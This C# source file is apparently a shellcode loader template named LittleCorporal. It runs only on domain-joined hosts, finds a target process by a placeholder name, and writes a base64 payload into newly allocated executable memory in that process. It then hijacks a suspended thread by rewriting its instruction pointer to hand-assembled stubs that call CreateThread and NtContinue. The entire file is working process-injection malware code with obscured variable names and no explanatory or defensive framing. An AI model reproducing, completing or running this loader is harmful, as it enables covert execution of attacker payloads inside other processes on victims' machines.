using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace LittleCorporal
{
    [ComVisible(true)]
    public class Loader
    {
        [Flags]
        public enum VAR21 : uint
        {
            PROCESS_VM_OPERATION = 0x00000008,
            PROCESS_VM_WRITE = 0x00000020,
        }

        [Flags]
        public enum VAR22 : uint
        {
            ZERO_FLAG = 0x00000000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_NO_WINDOW = 0x08000000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_SEPARATE_WOW_VDM = 0x00001000,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_SUSPENDED = 0x00000004,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            DEBUG_PROCESS = 0x00000001,
            DETACHED_PROCESS = 0x00000008,
            EXTENDED_VAR24_PRESENT = 0x00080000,
            INHERIT_PARENT_AFFINITY = 0x00010000
        }

        public struct VAR23
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }
        public struct VAR24
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [Flags]
        public enum VAR25 : int
        {
            THREAD_TERMINATE = (0x0001),
            THREAD_SUSPEND_RESUME = (0x0002),
            THREAD_GET_CONTEXT = (0x0008),
            THREAD_SET_CONTEXT = (0x0010),
            THREAD_SET_INFORMATION = (0x0020),
            THREAD_QUERY_INFORMATION = (0x0040),
            THREAD_SET_THREAD_TOKEN = (0x0080),
            THREAD_IMPERSONATE = (0x0100),
            THREAD_DIRECT_IMPERSONATION = (0x0200)
        }

        public class VAR26
        {
            public const uint TH32CS_SNAPHEAPLIST = 0x00000001;
            public const uint TH32CS_SNAPPROCESS = 0x00000002;
            public const uint TH32CS_SNAPTHREAD = 0x00000004;
            public const uint TH32CS_SNAPMODULE = 0x00000008;
            public const uint TH32CS_SNAPMODULE32 = 0x00000010;
            public const uint TH32CS_SNAPALL = (TH32CS_SNAPHEAPLIST | TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD | TH32CS_SNAPMODULE);
            public const uint TH32CS_INHERIT = 0x80000000;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct VAR27
        {
            public UInt32 dwSize;
            public UInt32 cntUsage;
            public UInt32 th32ThreadID;
            public UInt32 th32OwnerProcessID;
            public UInt32 tpBasePri;
            public UInt32 tpDeltaPri;
            public UInt32 dwFlags;
        }

        public enum VAR28 : uint
        {
            VAR30_AMD64 = 0x100000,
            VAR30_CONTROL = VAR30_AMD64 | 0x01,
            VAR30_INTEGER = VAR30_AMD64 | 0x02,
            VAR30_SEGMENTS = VAR30_AMD64 | 0x04,
            VAR30_FLOATING_POINT = VAR30_AMD64 | 0x08,
            VAR30_DEBUG_REGISTERS = VAR30_AMD64 | 0x10,
            VAR30_FULL = VAR30_CONTROL | VAR30_INTEGER | VAR30_FLOATING_POINT,
            VAR30_ALL = VAR30_CONTROL | VAR30_INTEGER | VAR30_SEGMENTS | VAR30_FLOATING_POINT | VAR30_DEBUG_REGISTERS
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct M128A
        {
            public ulong High;
            public long Low;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct VAR29
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        [StructLayout(LayoutKind.Sequential, Size = 0x4d0, Pack = 16)]
        public struct VAR30
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public uint ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;
        }

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 MEM_RESERVE = 0x2000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        internal const int SECTION_QUERY = 0x0001;
        internal const int SECTION_MAP_WRITE = 0x0002;
        internal const int SECTION_MAP_READ = 0x0004;
        internal const int SECTION_MAP_EXECUTE = 0x0008;
        internal const int SECTION_EXTEND_SIZE = 0x0010;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, VAR22 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref VAR24 lpStartupInfo, out VAR23 lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll")]
        public static extern bool Thread32First(IntPtr hSnapshot, ref VAR27 VAR7);

        [DllImport("kernel32.dll")]
        public static extern bool Thread32Next(IntPtr hSnapshot, ref VAR27 VAR7);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenThread(VAR25 dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int SuspendThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetThreadContext(IntPtr hThread, ref VAR30 lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern ulong GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetThreadContext(IntPtr hThread, ref VAR30 lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int ResumeThread(IntPtr hThread);

        public static bool domainJoined()
        {
            if (string.Equals("", System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName, StringComparison.CurrentCultureIgnoreCase))
            {
                return false; 
            }
            return true;
        }

        public static void Main()
        {
            bool FUNC1 = domainJoined();
            if (FUNC1)
            {
                Process VAR5 = Process.GetProcessesByName("REPLACE1")[0];

                if (VAR5.Id == 0)
                {
                    Environment.Exit(0);
                }
                else
                {
                    string r = "REPLACE2";
                    byte[] b2 = System.Convert.FromBase64String(r);
                    byte[] b = (b2);

                    IntPtr VAR6 = OpenProcess(
                      (int)VAR21.PROCESS_VM_OPERATION | (int)VAR21.PROCESS_VM_WRITE,
                      false,
                      (int)VAR5.Id
                    );

                    if (VAR6 == null)
                    {
                        Environment.Exit(0);
                    }
                    else
                    {
                        VAR27 VAR7 = new VAR27();
                        VAR7.dwSize = (uint)System.Runtime.InteropServices.Marshal.SizeOf(typeof(VAR27));
                        IntPtr VAR9 = IntPtr.Zero;
                        IntPtr VAR8;

                        VAR8 = CreateToolhelp32Snapshot(
                            VAR26.TH32CS_SNAPTHREAD,
                            (uint)0
                        );

                        if (Thread32First(VAR8, ref VAR7) == true)
                        {
                            while (Thread32Next(VAR8, ref VAR7))
                            {
                                if (VAR7.th32OwnerProcessID == VAR5.Id)
                                {
                                    VAR9 = OpenThread(
                                        VAR25.THREAD_SUSPEND_RESUME | VAR25.THREAD_SET_CONTEXT | VAR25.THREAD_GET_CONTEXT,
                                        false,
                                        VAR7.th32ThreadID
                                    );

                                    break;
                                }
                            }
                        }

                        CloseHandle(
                            VAR8
                        );

                        int VAR10 = SuspendThread(
                            VAR9
                        );

                        if (VAR10 == -1)
                        {
                            Environment.Exit(0);
                        }
                        else
                        {
                            VAR30 VAR11 = new VAR30();
                            VAR11.ContextFlags = (uint)VAR28.VAR30_ALL;

                            bool FUNC3 = GetThreadContext(
                               VAR9,
                               ref VAR11
                             );

                            if (!FUNC3)
                            {
                                Environment.Exit(0);
                            }
                            else
                            {
                                IntPtr VAR12 = VirtualAllocEx(
                                    VAR6,
                                    IntPtr.Zero,
                                    (uint)b.Length,
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_EXECUTE_READWRITE
                                );

                                if (VAR12 == null)
                                {
                                    Environment.Exit(0);
                                }
                                else
                                {
                                    UIntPtr bytesWritten;
                                    bool VAR13 = WriteProcessMemory(
                                        VAR6,
                                        VAR12,
                                        b,
                                        (uint)b.Length,
                                        out bytesWritten
                                    );

                                    if (!VAR13)
                                    {
                                        Environment.Exit(0);
                                    }
                                    else
                                    {
                                        byte[] VAR14 = new byte[64];
                                        int z = 0;

                                        VAR14[z++] = 0x48;
                                        VAR14[z++] = 0x31;
                                        VAR14[z++] = 0xc9;
                                        VAR14[z++] = 0x48;
                                        VAR14[z++] = 0x31;
                                        VAR14[z++] = 0xd2;
                                        VAR14[z++] = 0x49;
                                        VAR14[z++] = 0xb8;
                                        ulong placeremotelyTemp = (ulong)VAR12;
                                        byte[] allocAddress = BitConverter.GetBytes(placeremotelyTemp);
                                        allocAddress.CopyTo(VAR14, z);
                                        z += 0x8;

                                        VAR14[z++] = 0x4d;
                                        VAR14[z++] = 0x31;
                                        VAR14[z++] = 0xc9;
                                        VAR14[z++] = 0x4c;
                                        VAR14[z++] = 0x89;
                                        VAR14[z++] = 0x4c;
                                        VAR14[z++] = 0x24;
                                        VAR14[z++] = 0x20;
                                        VAR14[z++] = 0x4c;
                                        VAR14[z++] = 0x89;
                                        VAR14[z++] = 0x4c;
                                        VAR14[z++] = 0x24;
                                        VAR14[z++] = 0x28;

                                        ulong FUNC4 = GetProcAddress(GetModuleHandle("kernel32"), "CreateThread");

                                        if (FUNC4 == 0)
                                        {
                                            Environment.Exit(0);
                                        }
                                        else
                                        {
                                            VAR14[z++] = 0x48;
                                            VAR14[z++] = 0xb8;
                                            byte[] VAR15 = BitConverter.GetBytes(FUNC4);
                                            VAR15.CopyTo(VAR14, z);
                                            z += 0x8;

                                            VAR14[z++] = 0xff;
                                            VAR14[z++] = 0xd0;

                                            VAR14[z++] = 0xc3;

                                            byte[] VAR18 = new byte[64];
                                            int i = 0;
                                            byte[] VAR17 = new byte[4];

                                            VAR18[i++] = 0xe8;

                                            int VAR16 = VAR18.Length + (int)System.Runtime.InteropServices.Marshal.SizeOf(typeof(VAR30)) - 0x4 - i;
                                            byte[] scOffset = BitConverter.GetBytes(VAR16);
                                            scOffset.CopyTo(VAR18, i);
                                            i += (int)System.Runtime.InteropServices.Marshal.SizeOf(VAR16);

                                            VAR18[i++] = 0xe8;
                                            VAR18[i++] = 0x00;
                                            VAR18[i++] = 0x00;
                                            VAR18[i++] = 0x00;
                                            VAR18[i++] = 0x00;

                                            int contextOffset = i;

                                            VAR18[i++] = 0x59;
                                            VAR18[i++] = 0x48;
                                            VAR18[i++] = 0x83;
                                            VAR18[i++] = 0xc1;
                                            VAR18[i++] = 0x36;
                                            VAR18[i++] = 0x48;
                                            VAR18[i++] = 0x31;
                                            VAR18[i++] = 0xd2;
                                            VAR18[i++] = 0x48;
                                            VAR18[i++] = 0xb8;

                                            ulong FUNC5 = GetProcAddress(GetModuleHandle("ntdll"), "NtContinue");

                                            if (FUNC5 == 0)
                                            {
                                                Environment.Exit(0);
                                            }
                                            else
                                            {
                                                byte[] ntcontinueAddress = BitConverter.GetBytes(FUNC5);
                                                ntcontinueAddress.CopyTo(VAR18, i);
                                                i += 0x8;

                                                VAR18[i++] = 0x48;
                                                VAR18[i++] = 0x83;
                                                VAR18[i++] = 0xec;
                                                VAR18[i++] = 0x20;
                                                VAR18[i++] = 0xff;
                                                VAR18[i++] = 0xd0;

                                                VAR17[0] = 0x48;
                                                VAR17[1] = 0x83;
                                                VAR17[2] = 0xe4;
                                                VAR17[3] = 0xf0;

                                                byte[] VAR19 = new byte[VAR18.Length + (int)System.Runtime.InteropServices.Marshal.SizeOf(VAR11) + VAR17.Length + VAR14.Length];

                                                VAR18.CopyTo(VAR19, 0);

                                                byte[] contextRecord = new byte[Marshal.SizeOf(VAR11)];
                                                IntPtr ptr = Marshal.AllocHGlobal(Marshal.SizeOf(VAR11));
                                                Marshal.StructureToPtr(VAR11, ptr, true);
                                                Marshal.Copy(ptr, contextRecord, 0, Marshal.SizeOf(VAR11));

                                                contextRecord.CopyTo(VAR19, VAR18.Length);
                                                VAR17.CopyTo(VAR19, VAR18.Length + contextRecord.Length);
                                                VAR14.CopyTo(VAR19, VAR18.Length + contextRecord.Length + VAR17.Length);
                                                int finalLength = VAR18.Length + contextRecord.Length + VAR17.Length + VAR14.Length;

                                                IntPtr VAR20 = VirtualAllocEx(
                                                    VAR6,
                                                    IntPtr.Zero,
                                                    (uint)finalLength,
                                                    MEM_RESERVE | MEM_COMMIT,
                                                    PAGE_EXECUTE_READWRITE
                                                );

                                                if (VAR20 == null)
                                                {
                                                    Environment.Exit(0);
                                                }
                                                else
                                                {
                                                    UIntPtr bytesWritten1;

                                                    bool writeMemory = WriteProcessMemory(
                                                        VAR6,
                                                        VAR20,
                                                        VAR19,
                                                        (uint)finalLength,
                                                        out bytesWritten1
                                                    );

                                                    if (!writeMemory)
                                                    {
                                                        Environment.Exit(0);
                                                    }
                                                    else
                                                    {
                                                        VAR11.Rsp -= 0x2000;
                                                        VAR11.Rip = (ulong)VAR20;

                                                        bool setRip = SetThreadContext(
                                                            VAR9,
                                                            ref VAR11
                                                        );

                                                        if (!setRip)
                                                        {
                                                            Environment.Exit(0);
                                                        }
                                                        else
                                                        {
                                                            ResumeThread(
                                                                VAR9
                                                            );

                                                            ResumeThread(
                                                                VAR9
                                                            );
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
